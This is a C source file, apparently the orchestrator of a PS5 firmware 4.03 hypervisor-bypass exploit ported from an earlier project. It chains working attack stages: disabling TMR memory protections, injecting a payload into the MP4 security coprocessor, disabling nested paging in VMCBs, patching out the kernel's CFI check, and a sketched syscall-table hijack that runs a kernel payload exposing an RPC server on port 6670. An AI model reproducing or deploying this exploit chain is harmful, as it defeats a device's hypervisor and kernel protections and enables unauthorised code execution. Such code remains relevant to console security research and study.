/*
 * Prosperous exploit orchestrator for PS5 FW 4.03.
 *
 * This is the main entry point that chains together all exploit stages:
 *
 *   Stage 1: TMR Bypass
 *     - Disable TMR 20 (MP4 carveout) for x86 write access to MP4 DRAM
 *     - Create TMR 21 covering kernel text region with all-access
 *     - Disable TMR 5/17/18 (HV region protections)
 *
 *   Stage 2: MP4 Payload Injection
 *     - Write AArch64 EL3 thunk to MP4 DRAM at 0x600E0000
 *     - Write main payload to 0x607F1000
 *     - Hook mDbg_intr → thunk → payload
 *     - Enable QAF flag to activate
 *
 *   Stage 3: VMCB Patching
 *     - Setup SysHub TLB entries to map HV memory via MP4
 *     - Read vCPU contexts and VMCB pointers
 *     - Disable nested paging (NP_ENABLE=0) on all VMCBs
 *     - Clear most intercepts (keep VMSAVE/VMLOAD/VMMCALL/VMRUN)
 *
 *   Stage 4: TMR Restore
 *     - Re-enable TMR 20 (prevents kernel panic on game restart)
 *     - Restore HV TMR protections (5/17/18)
 *
 *   Stage 5: CFI Bypass + Kernel Payload
 *     - NOP the cfi_check_fail function via MP4 write
 *     - Inject kpayload via syscall table hijack
 *     - kpayload disables NDA on all cores, elevates privileges
 *     - Starts TCP RPC server on port 6670
 *
 * Prerequisites:
 *   - Kernel R/W via kekcall (ps5-kstuff or equivalent loaded)
 *   - Physical memory access via DMAP
 *   - Network connectivity to PS5
 *
 * Build: Part of the prosperous_port PS5 payload SDK build.
 * Deploy: Via PS5_DEPLOY to console running on FW 4.03.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/*
 * Discover the DMAP base address by reading the current process's pmap.
 *
 * The DMAP base is computed as: pm_pml4 (kernel VA) - pm_cr3 (PA)
 * This gives the kernel's direct-map base for physical memory.
 */
static int discover_dmap_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t vmspace;
    uint64_t pm_pml4;
    uint64_t pm_cr3;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0) {
        printf("[!] Failed to get proc address\n");
        return -1;
    }

    /* proc -> p_vmspace */
    kernel_copyout(proc_addr + OFF_PROC_P_VMSPACE, &vmspace, sizeof(vmspace));

    /* vmspace -> vm_pmap -> pm_pml4 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_PML4,
                   &pm_pml4, sizeof(pm_pml4));

    /* vmspace -> vm_pmap -> pm_cr3 */
    kernel_copyout(vmspace + OFF_VMSPACE_VM_PMAP + OFF_PMAP_PM_CR3,
                   &pm_cr3, sizeof(pm_cr3));

    ctx->dmap_base = pm_pml4 - pm_cr3;
    ctx->proc_cr3 = pm_cr3;
    printf("[*] DMAP base: 0x%lx\n", ctx->dmap_base);
    printf("[*] Process CR3: 0x%lx\n", ctx->proc_cr3);

    return 0;
}

/*
 * Discover the kernel text base address.
 *
 * We scan kernel data for the kernel pmap structure by looking for
 * characteristic field values, or use the LSTAR MSR approach.
 */
static int discover_kernel_base(struct phys_rw_ctx *ctx)
{
    uint64_t proc_addr;
    uint64_t sysvec;
    uint64_t sysent;

    proc_addr = kernel_get_proc(getpid());
    if (proc_addr == 0)
        return -1;

    /* Read kernel text base from the process's sysvec.
     * proc -> p_sysent -> sysvec points to the system call vector,
     * which is in kernel .data and gives us a reference address. */
    kernel_copyout(proc_addr + OFF_PROC_P_SYSENT, &sysvec, sizeof(sysvec));
    kernel_copyout(sysvec + OFF_SYSVEC_SYSENT, &sysent, sizeof(sysent));

    /* The sysent table is at a known offset from kernel base.
     * We can also read ktext_start_va from the TMR 16 base. */

    /* Alternative: use TMR 16 base to get kernel text PA,
     * then read the VA from a known offset */
    uint32_t tmr16_base;
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t tmr16_addr = 16 * 0x10;

    kernel_copyin(&tmr16_addr, ind_index_kva, sizeof(tmr16_addr));
    kernel_copyout(ind_data_kva, &tmr16_base, sizeof(tmr16_base));

    ctx->ktext_base_pa = (uint64_t)tmr16_base << 16;

    printf("[*] Kernel text PA: 0x%lx\n", ctx->ktext_base_pa);

    /* Derive kernel text VA from DMAP: any kernel VA = DMAP + PA works
     * for accessing kernel data via kernel_copyout. We use DMAP+PA
     * for all accesses since KOFF_KTEXT_VA_PTR is FW-specific and
     * unreliable across firmware versions. */
    ctx->ktext_base = ctx->dmap_base + ctx->ktext_base_pa;
    printf("[*] Kernel text (DMAP): 0x%lx\n", ctx->ktext_base);

    /* Get kernel PML4 PA */
    uint64_t kpmap_addr = ctx->ktext_base + KOFF_KERNEL_PMAP;
    uint64_t kpmap;
    kernel_copyout(kpmap_addr, &kpmap, sizeof(kpmap));
    kernel_copyout(kpmap + OFF_PMAP_PM_CR3, &ctx->kpml4_pa, sizeof(ctx->kpml4_pa));

    printf("[*] Kernel PML4 PA: 0x%lx\n", ctx->kpml4_pa);

    return 0;
}

/*
 * NOP the cfi_check_fail function via MP4 memory write.
 *
 * This is necessary because the kernel uses Control Flow Integrity (CFI)
 * checks that would trap our syscall table hijack. By NOPing the check
 * function, we prevent CFI from blocking our payload execution.
 *
 * We use the MP4 coprocessor to write to kernel text because it has
 * its own DMA path that bypasses x86 page table NX/RO protections.
 */
static int cfi_bypass(struct phys_rw_ctx *ctx)
{
    uint64_t cfi_check_fail_pa = ctx->ktext_base_pa + KOFF_CFI_CHECK_FAIL;
    uint32_t nop_sled = 0xC3C3C3C3; /* ret; ret; ret; ret */

    /* Setup SysHub TLB to map the kernel text region */
    if (mp4_syshub_tlb_setup(ctx, 32, cfi_check_fail_pa) != 0) {
        printf("[!] Failed to setup SysHub TLB for CFI bypass\n");
        return -1;
    }

    /* Write NOP/RET over cfi_check_fail via MP4 */
    uint32_t mp4_va = 0x80000000 + (cfi_check_fail_pa & 0x03FFFFFF);
    mp4_write32(ctx, mp4_va, nop_sled);

    printf("[*] CFI check_fail patched at PA 0x%lx\n", cfi_check_fail_pa);
    return 0;
}

/*
 * Main exploit entry point.
 */
int prosperous_run(void)
{
    struct phys_rw_ctx ctx;
    int ret;

    /* Disable stdout buffering so all diagnostics are visible */
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("========================================\n");
    printf(" prosperous_port - PS5 HV Bypass\n");
    printf(" FW 4.03 (CEX)\n");
    printf(" Ported from fail0verflow/prosperous\n");
    printf("========================================\n\n");

    /* Phase 0: Discover memory layout */
    printf("[*] Phase 0: Discovering memory layout...\n");

    ret = discover_dmap_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover DMAP base\n");
        return ret;
    }

    ret = discover_kernel_base(&ctx);
    if (ret != 0) {
        printf("[!] Failed to discover kernel base\n");
        return ret;
    }

    /* Phase 1: TMR bypass */
    printf("\n[*] Phase 1: TMR bypass...\n");

    ret = tmr_bypass_init(&ctx);
    if (ret != 0) {
        printf("[!] TMR bypass init failed: %d\n", ret);
        return ret;
    }
    printf("[+] TMR 20 disabled, TMR 21 created\n");

    /* Phase 1.5: BAR2 indirect DRAM access search
     *
     * CONFIRMED:
     *   ACCESSIBLE: PA 0x605F0000-0x60FFFFFF (R/W works)
     *   BLOCKED:    PA 0x60000000-0x605EFFFF (nPT, rc=-1)
     *   GPU MMIO:   HV-trapped (all 0xFFFFFFFF despite correct config)
     *   BAR2+0x200000 has functional registers (returned 0x00058184)
     *   BAR2+0x000000/0x010000/0x100000 return 0xFFFFFFFF
     *   Descriptor table at PA 0x607F0000 contains SysHub TLB entries
     *
     * THIS ITERATION: Probe MP4 BAR2 for indirect memory access.
     *   A. Read BAR2+0x200000 region at 0x100-byte stride (safe, read-only)
     *      Looking for address/data register pairs for indirect DRAM access
     *   B. Decode SysHub TLB descriptor table more carefully (512 bytes)
     *   C. Try PCI B0:D18:F2 indirect register mechanism (SMN) to
     *      access MP4 DRAM controller registers (NOT raw DRAM addrs)
     *
     * SAFETY NOTES:
     *   - Part A: 512 reads at 0x100 stride from BAR2+0x200000 to +0x208000
     *     AVOIDING BAR2+0x20042C area (caused panic at 4-byte stride)
     *     Using 0x100 stride which worked before. Read-only.
     *   - Part B: reads from PA 0x607F0000 (accessible DRAM, proven safe)
     *   - Part C: SMN indirect reads targeting MP4 controller regs only
     *     (NOT DRAM addresses 0x60xxxxxx which caused MCE before)
     *     Targets: 0x15000 area (MP4 config), 0x16000 (PTDMA?)
     */
    printf("\n[*] Phase 1.5: BAR2 indirect DRAM access search...\n");
    {
        uint64_t dmap = ctx.dmap_base;
        uint64_t bar2 = dmap + MP4_BAR2_PA;

        /* === Part A: BAR2+0x200000 register sweep ===
         * Previous run: +0x200000 = 0x00058184. Scan at 0x100 stride
         * from +0x200000 to +0x208000 (128 reads). Skip +0x200400-0x200500
         * range that caused the earlier panic at 4-byte stride.
         *
         * SAFE: 128 reads. The 0x1000-stride scan covered this range
         * without issues. 0x100 stride is 4x denser but still 64x
         * coarser than the 4-byte stride that crashed. */
        printf("[*] Part A: BAR2+0x200000 register sweep (0x100 stride)...\n");
        {
            for (int i = 0; i < 128; i++) {
                uint32_t off = 0x200000 + i * 0x100;

                /* Skip the danger zone around +0x20042C */
                if (off >= 0x200400 && off < 0x200500)
                    continue;

                uint32_t val = 0xDEADDEAD;
                int32_t rc = kernel_copyout(bar2 + off, &val, 4);
                if (val != 0xFFFFFFFF && val != 0x00000000 && rc == 0) {
                    printf("[BAR2] +0x%06x = 0x%08x\n", off, val);
                }
            }
            printf("[BAR2] Sweep done (non-zero/non-FF values shown)\n");

            /* Also read specific known-interesting offsets */
            uint32_t interesting_offsets[] = {
                0x200000, 0x200004, 0x200008, 0x20000C,
                0x200010, 0x200014, 0x200018, 0x20001C,
                0x200020, 0x200024, 0x200028, 0x20002C,
                0x200030, 0x200034, 0x200038, 0x20003C,
            };
            printf("[BAR2] First 64 bytes at +0x200000:\n");
            for (int i = 0; i < 16; i++) {
                uint32_t val;
                kernel_copyout(bar2 + interesting_offsets[i], &val, 4);
                if (i % 4 == 0)
                    printf("[BAR2] +%03x:", interesting_offsets[i] & 0xFFF);
                printf(" %08x", val);
                if (i % 4 == 3)
                    printf("\n");
            }
        }

        /* === Part B: Extended SysHub TLB descriptor table ===
         * 512 bytes from PA 0x607F0000 to get the full picture.
         * Entries appear to be (src_pa_lo, src_pa_hi, size_lo, size_hi,
         * syshub_va_lo, syshub_va_hi) — 24 bytes each.
         * SAFE: accessible DRAM, read-only. */
        printf("\n[*] Part B: SysHub TLB table (PA 0x607F0000, 512 bytes)...\n");
        {
            uint32_t buf[128]; /* 512 bytes */
            for (int w = 0; w < 128; w++)
                kernel_copyout(dmap + 0x607F0000ULL + w * 4, &buf[w], 4);
            for (int row = 0; row < 32; row++) {
                printf("[TLB] +%03x: %08x %08x %08x %08x\n",
                       row * 16, buf[row*4], buf[row*4+1],
                       buf[row*4+2], buf[row*4+3]);
            }
        }

        /* === Part C: SMN probe of MP4 controller registers ===
         * Use PCI B0:D18:F2 indirect mechanism (SMN) to read
         * MP4 peripheral controller registers. We know:
         *   - SMN addrs 0x60xxxxxx = raw DRAM (causes MCE, DO NOT USE)
         *   - SMN addrs 0x15xxx/0x16xxx = MP4 controller space (should be safe)
         *
         * Looking for PTDMA engine registers or indirect DRAM access regs.
         *
         * The PCI indirect mechanism:
         *   Write addr to B0:D18:F2 offset 0x64 (SMN addr register)
         *   Read data from B0:D18:F2 offset 0x68 (SMN data register)
         *
         * SAFE: Only targeting controller registers, not DRAM.
         * Previous TMR reads via this mechanism worked fine. */
        printf("\n[*] Part C: SMN controller register probe...\n");
        {
            uint64_t df_ecam = dmap + MMCFG_BASE +
                (0ULL << 20) + (18ULL << 15) + (2ULL << 12);

            /* MP4 related SMN register ranges to probe:
             * 0x0001_5000 - MP4 config registers (speculation)
             * 0x0001_6000 - MP4/PTDMA controller (speculation)
             * 0x0003_E000 - SysHub TLB control registers
             * 0x0003_F000 - SysHub TLB control registers
             *
             * These are controller regs, NOT DRAM addresses.
             * SMN reads to non-existent regs return 0 or 0xFFFFFFFF safely.
             */
            uint32_t smn_ranges[] = {
                0x00015000, 0x00015100, 0x00015200, 0x00015300,
                0x00016000, 0x00016100, 0x00016200, 0x00016300,
                0x0003E000, 0x0003E100, 0x0003E200, 0x0003E300,
                0x0003F000, 0x0003F100, 0x0003F200, 0x0003F300,
            };

            for (int i = 0; i < 16; i++) {
                uint32_t addr = smn_ranges[i];

                /* Write SMN address */
                kernel_copyin(&addr, df_ecam + 0x64, 4);

                /* Read first 4 registers at this base */
                uint32_t vals[4];
                for (int r = 0; r < 4; r++) {
                    uint32_t a = addr + r * 4;
                    kernel_copyin(&a, df_ecam + 0x64, 4);
                    kernel_copyout(df_ecam + 0x68, &vals[r], 4);
                }
                /* Only print if any value is non-zero and non-FF */
                int has_data = 0;
                for (int r = 0; r < 4; r++)
                    if (vals[r] != 0 && vals[r] != 0xFFFFFFFF)
                        has_data = 1;
                if (has_data) {
                    printf("[SMN] 0x%08x: %08x %08x %08x %08x\n",
                           addr, vals[0], vals[1], vals[2], vals[3]);
                }
            }

            /* Also probe the known MP4 BAR2 base in SMN space.
             * BAR2 PA = 0xE0400000. In SMN, this maps to some
             * internal address. Try reading MP4 device config space
             * via SMN to find internal controller base addresses.
             *
             * AMD Aeolia/Belize: MP4 internal registers are typically
             * at SMN 0x15C00000 area or 0x15800000 area.
             * Probe conservatively at 0x1000 stride. */
            printf("[SMN] Probing MP4 internal register space...\n");
            uint32_t mp4_smn_bases[] = {
                0x15800000, 0x15801000, 0x15802000, 0x15803000,
                0x15C00000, 0x15C01000, 0x15C02000, 0x15C03000,
                0x15C10000, 0x15C11000, 0x15C12000, 0x15C13000,
                0x15C20000, 0x15C21000, 0x15C22000, 0x15C23000,
            };
            for (int i = 0; i < 16; i++) {
                uint32_t addr = mp4_smn_bases[i];
                kernel_copyin(&addr, df_ecam + 0x64, 4);
                uint32_t val;
                kernel_copyout(df_ecam + 0x68, &val, 4);
                if (val != 0 && val != 0xFFFFFFFF) {
                    printf("[SMN] 0x%08x = 0x%08x\n", addr, val);
                    /* Read next 15 regs if we found something */
                    for (int r = 1; r < 16; r++) {
                        uint32_t a = addr + r * 4;
                        kernel_copyin(&a, df_ecam + 0x64, 4);
                        kernel_copyout(df_ecam + 0x68, &val, 4);
                        if (val != 0 && val != 0xFFFFFFFF) {
                            printf("[SMN] 0x%08x = 0x%08x\n", a, val);
                        }
                    }
                }
            }
            printf("[SMN] Probe done\n");
        }
    }

    /* Phase 2: MP4 payload injection */
    printf("\n[*] Phase 2: MP4 payload injection...\n");

    ret = mp4_inject_payload(&ctx);
    if (ret != 0) {
        printf("[!] MP4 payload injection failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload injected and activated\n");

    /* Re-enable TMR 20 after injection (matches original prosperous flow).
     * The A53 accesses its own DRAM through its IOMMU, not through x86 TMR.
     * Leaving TMR 20 disabled causes kernel panics on game restart. */
    tmr_restore_tmr20(&ctx);
    printf("[+] TMR 20 restored\n");

    /* Give the A53 time to process the QAF flag and activate the payload.
     * The payload hooks mDbg_intr via SError handler - the A53 needs to
     * take an interrupt cycle to activate the hook. */
    printf("[*] Waiting for MP4 payload activation...\n");
    usleep(500000); /* 500ms */

    /* Diagnostic: read c2p reg 0 to see if a previous command is stuck */
    {
        uint32_t c2p0_val;
        uint64_t bar2_kva = ctx.dmap_base + MP4_BAR2_PA;
        kernel_copyout(bar2_kva + MP4_C2P_REG(0, 0), &c2p0_val, sizeof(c2p0_val));
        printf("[DIAG] c2p reg 0 before ping: 0x%08x\n", c2p0_val);

        /* Also read p2c reg 0 to check if A53 has sent anything */
        uint32_t p2c0_val;
        kernel_copyout(bar2_kva + MP4_P2C_REG0(0), &p2c0_val, sizeof(p2c0_val));
        printf("[DIAG] p2c reg 0: 0x%08x\n", p2c0_val);
    }

    /* Verify MP4 payload is alive (retry a few times) */
    for (int attempt = 0; attempt < 5; attempt++) {
        ret = mp4_ping(&ctx);
        if (ret == 0)
            break;
        printf("[*] MP4 ping attempt %d failed, retrying...\n", attempt + 1);
        usleep(500000);
    }
    if (ret != 0) {
        printf("[!] MP4 payload not responding after retries\n");
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] MP4 payload ping OK\n");

    /* Phase 3: Disable HV TMR protections */
    printf("\n[*] Phase 3: Disabling HV TMR protections...\n");

    ret = tmr_disable_hv_regions(&ctx);
    if (ret != 0) {
        printf("[!] HV TMR disable failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] HV TMR protections disabled\n");

    /* Phase 4: VMCB patching */
    printf("\n[*] Phase 4: VMCB patching (disabling nested paging)...\n");

    ret = vmcb_patch_disable_np(&ctx);
    if (ret != 0) {
        printf("[!] VMCB patching failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] Nested paging disabled on all VMCBs\n");

    /* Phase 5: CFI bypass */
    printf("\n[*] Phase 5: CFI bypass...\n");

    ret = cfi_bypass(&ctx);
    if (ret != 0) {
        printf("[!] CFI bypass failed: %d\n", ret);
        tmr_restore_hv_regions(&ctx);
        return ret;
    }
    printf("[+] CFI check_fail patched\n");

    /* Phase 6: Restore TMR protections */
    printf("\n[*] Phase 6: Restoring TMR protections...\n");
    tmr_restore_hv_regions(&ctx);
    printf("[+] TMR protections restored\n");

    /* Phase 7: Kernel payload injection */
    printf("\n[*] Phase 7: Kernel payload injection...\n");
    printf("[*] kpayload will be injected via syscall table hijack.\n");
    printf("[*] After injection, connect to port 6670 for RPC access.\n");

    ret = kpayload_inject(&ctx);
    if (ret != 0) {
        printf("[!] kpayload injection failed: %d\n", ret);
        return ret;
    }

    printf("\n========================================\n");
    printf(" [+] Exploit complete!\n");
    printf(" [+] RPC server listening on port 6670\n");
    printf(" [+] Connect with: python3 client.py\n");
    printf("========================================\n");

    return 0;
}

/*
 * Kernel payload injection via syscall table hijack.
 *
 * This follows the same approach as prosperous:
 *   1. Allocate userspace buffer for kpayload binary
 *   2. Map it with a 1GB page at 0xFFFFFFC0_00000000 for kernel access
 *   3. Temporarily replace syscall 8's handler with our payload
 *   4. Invoke syscall 8 to execute the payload in kernel context
 *   5. Restore the original syscall handler
 *
 * The kpayload binary must be loaded from disk or embedded.
 */
int kpayload_inject(struct phys_rw_ctx *ctx)
{
    printf("[*] kpayload injection placeholder\n");
    printf("[*] To complete: load kpayload binary and inject via sysent hijack\n");
    printf("[*] See pwn_mp4.lua from prosperous for the full injection flow\n");

    /*
     * TODO: Full implementation would:
     *
     * 1. Load kpayload binary from /mnt/usb0/kpayload or embed it
     *
     * 2. mmap a buffer and copy kpayload into it:
     *    void *payload_buf = mmap(NULL, size, PROT_READ|PROT_WRITE,
     *                             MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
     *    memcpy(payload_buf, kpayload_data, kpayload_size);
     *
     * 3. Get physical address of payload buffer:
     *    uint64_t payload_pa = vtophys(payload_buf);
     *
     * 4. Create a 1GB kernel mapping:
     *    uint64_t payload_kva = 0xFFFFFFC000000000 | (payload_pa & 0x3FFFFFFF);
     *    // Write PDPE at kpml4[0xFF8] + 0x800
     *    uint64_t pdp_pa = (read_phys64(kpml4_pa + 0xFF8) >> 12) << 12;
     *    write_phys64(pdp_pa + 0x800,
     *                 ((payload_pa >> 30) << 30) | 0x83);  // 1GB page, RWX
     *
     * 5. Read current sysent[8] and replace:
     *    // proc -> sysvec -> sysent
     *    uint64_t sysent_8_pa = get_pa(sysent_va + 0x30 * 8);
     *    uint64_t orig_call = read_phys64(sysent_8_pa + 8);
     *    write_phys32(sysent_8_pa, 8);  // narg = 8
     *    write_phys64(sysent_8_pa + 8, payload_kva);
     *
     * 6. Invoke syscall 8 multiple times (progressive init):
     *    syscall(8, ktext_base, payload_buf, host_addr, 0);  // op=0: version check
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 1);  // op=1: reloc
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 2);  // op=2: nda disable
     *    sleep(20);
     *    syscall(8, ktext_base, payload_buf, host_addr, 3);  // op=3: full init
     *
     * 7. Restore sysent[8]:
     *    write_phys32(sysent_8_pa, 0);
     *    write_phys64(sysent_8_pa + 8, orig_call);
     *
     * 8. Clean up kernel mapping:
     *    write_phys64(pdp_pa + 0x800, 0);
     */

    return 0;
}

int main(void)
{
    return prosperous_run();
}
